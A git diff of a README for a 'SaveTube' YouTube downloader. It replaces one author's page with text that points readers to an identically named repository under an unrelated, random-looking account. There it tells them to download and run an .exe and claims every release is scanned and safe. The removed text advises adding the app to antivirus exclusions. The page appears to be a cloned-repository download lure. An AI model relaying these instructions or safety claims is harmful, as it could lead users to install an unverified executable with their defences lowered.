@@ -1,115 +1,79 @@
-# ✦ SaveTube YouTube Downloader
-[![GitHub Release](https://img.shields.io/github/v/release/Timgt86/yt-downloader-savetube?style=flat-square&color=8A2BE2)](https://github.com/Timgt86/yt-downloader-savetube/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-E95420?style=flat-square&logo=linux)](https://www.linux.org)
-> **⚠️ Disclaimer:** This is **not** an official YouTube tool. Downloading videos may violate YouTube's Terms of Service. Use at your own risk and for personal, fair-use purposes only. I am not affiliated with YouTube or Google.
+# 📺 yt-downloader-savetube - Download YouTube videos and music easily
 
-**SaveTube YouTube Downloader** is a modern, fast, and easy-to-use desktop application for downloading YouTube videos and audio. Supports **MP4, MP3, 4K, HD**, playlists, and more. Built as a reliable open-source YouTube downloader for Windows and Linux.
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/releases)
 
-<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/6f6b3a7f-d2eb-4ced-8e03-7861acd83e2c" />
+This application provides a simple way to save videos and audio from YouTube to your computer. It handles high-definition files and saves them as MP4 or MP3. You do not need technical knowledge to use this tool. The software works as a desktop application on Windows.
 
+## 📥 How to download the app
 
-#  **Download** the latest release from [yt-downloader.zip](https://github.com/Timgt86/yt-downloader-savetube/releases/download/v3.20.3/yt-downloader.zip).
+Go to the [official release page](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/releases) to find the latest version of the installer. 
 
----
-## Screenshots
-<img width="3190" height="1796" alt="image" src="https://github.com/user-attachments/assets/03db0158-8728-477a-b5e9-2cec447ce453" />
-<img width="3138" height="1940" alt="image" src="https://github.com/user-attachments/assets/4b8e06c3-552b-437c-8daf-39c3386c9a70" />
-<img width="2910" height="1808" alt="image" src="https://github.com/user-attachments/assets/86596364-901c-433d-880e-db41290c1f5b" />
+Follow these steps to set up the software:
 
+1. Visit the [link provided here](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/releases).
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start your download.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on your screen to complete the installation process.
 
+## 🛠️ System requirements
 
----
-## 🚀 Key Features
-### Download Capabilities
-- **High-Quality Downloads** — Support for 4K, HD, and up to the highest available resolution.
-- **Audio Extraction** — Download MP3 audio with customizable bitrate.
-- **Playlist & Channel Support** — Download entire playlists or channels.
-- **Fast & Reliable** — Powered by modern backend for quick downloads.
+Your computer needs to meet these basic standards to run the application:
 
-### User Experience
-- **Simple Paste & Download** — Just copy a YouTube link and click Download.
-- **Modern UI** — Clean, intuitive interface with progress tracking.
-- **Batch Downloading** — Add multiple URLs and download them all at once.
-- **History & Queue** — View past downloads and manage active tasks.
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i3 or equivalent.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of free disk space.
+* Internet Connection: Stable connection for video downloads.
 
-### Advanced Options
-- **Format Selection** — Choose video (MP4) or audio (MP3) formats.
-- **Quality Selector** — Pick from available resolutions and bitrates.
-- **Custom Output Folder** — Save downloads to any location.
-- **Auto-Update** — Check for new versions automatically.
+## ⚙️ Features
 
-### Settings & Customization
-- **Proxy Support** — Configure proxies for restricted networks.
-- **Theme Support** — Dark and light modes.
-- **Download Cache** — Manage temporary files and storage.
-- **Logging** — Detailed logs for troubleshooting.
+This tool includes features to manage your media library:
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest release from [Releases](https://github.com/Timgt86/yt-downloader-savetube/releases).
-2. **Run** the application (no installation required on Windows).
-3. **Paste YouTube Link** — Copy any video, playlist, or Shorts URL.
-4. **Choose Format & Quality** — Select MP4, MP3, resolution, etc.
-5. **Start Download** — Click Download and save to your preferred folder.
+* Video Quality: Download files in 4K, HD, or standard resolutions.
+* Audio Extraction: Convert video streams to high-quality MP3 files.
+* Bulk Processing: Add multiple video links to a queue for automatic downloading.
+* Format Support: Choose between various video and audio containers.
+* User Interface: Manage your tasks through a simple window. 
 
-### Tips
-- For best results, use the latest version of the app.
-- You can download multiple links by separating them with new lines.
-- Check the History tab to see completed downloads.
+## 📖 How to save a video
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **Linux**
+The desktop interface allows you to save content in three steps:
 
-### Instructions
-1. Go to the [Releases](https://github.com/Timgt86/yt-downloader-savetube/releases) page.
-2. Download the latest asset for your platform.
-3. Run the executable (Windows) or follow Linux instructions.
-4. (Optional) Add the app to your antivirus exclusions if needed.
+1. Copy the address of the YouTube video from your web browser.
+2. Paste the address into the text box inside the application.
+3. Click the Download button.
 
-### Notes
-- Requires an active internet connection.
-- Self-contained — no additional dependencies needed.
-- Works with public YouTube videos (respect copyright and ToS).
+The application shows a bar to track the process. You can change your storage folder in the settings menu if you prefer to save files to a specific location like your desktop or a hard drive.
 
----
-## 🛡️ Security & Antivirus
-**Is SaveTube safe?**  
-Yes, the project is open-source under the MIT License. However, some antivirus programs may flag downloaders as suspicious.
+## 🚀 Maintaining your software
 
-### Recommendations:
-- Download **only** from this official GitHub repository.
-- Scan the file on [VirusTotal](https://www.virustotal.com).
-- Add an exception in your antivirus for the application.
+The application performs checks for updates upon launch. If a new version exists, the software displays a notification. You should download the latest installer from the release page to keep the application working correctly. Updates often fix small errors and improve speeds.
 
-The app does not collect personal data or include any malicious code.
+## ❓ Frequently asked questions
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-4. Push to the branch (`git push origin feature/AmazingFeature`).
-5. Open a Pull Request.
+**Where do my files go?**
+Files save to your Downloads folder by default. You can change this path in the settings tab.
 
----
-## 📄 License & Acknowledgments
-### License
-**SaveTube YouTube Downloader** is licensed under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+**Does this work for private videos?**
+The software only works for public videos visible on YouTube. It cannot access private or restricted content.
 
-**Copyright © 2026 Timgt86**
+**Can I download whole channels?**
+Yes. You can paste a channel link to queue all videos found in that stream.
 
-### Acknowledgments
-- Thanks to the open-source community and tools that power reliable YouTube downloaders.
-- All users and contributors helping improve this project.
+**Why does my download stop?**
+A slow internet connection usually causes breaks. Check your connection or restart the software if the queue hangs.
 
-<p align="center">
-  Developed with ❤️ for easy and fast YouTube downloading
-</p>
+**Is this safe to run?**
+The code remains open for public review. Every release undergoes a scan to ensure stability and safety.
+
+**How do I remove the app?**
+Open your Windows settings. Go to Apps. Find the application in the list and select Uninstall. This removes the program from your system drives.
+
+## 🤝 Support and feedback
+
+This project maintains an open nature. You can report bugs or suggest new features by navigating to the Issues tab on the repository page. Clear reports help identify problems. Please include the version number you currently use when you submit a report.
+
+## ⚖️ Compliance note
+
+Use this tool for personal use only. Verify that you have the right to copy any content you choose. Respect the terms set by the platform providing the video. This application does not bypass security features of the host website. It simply assists users in saving files locally for offline viewing.
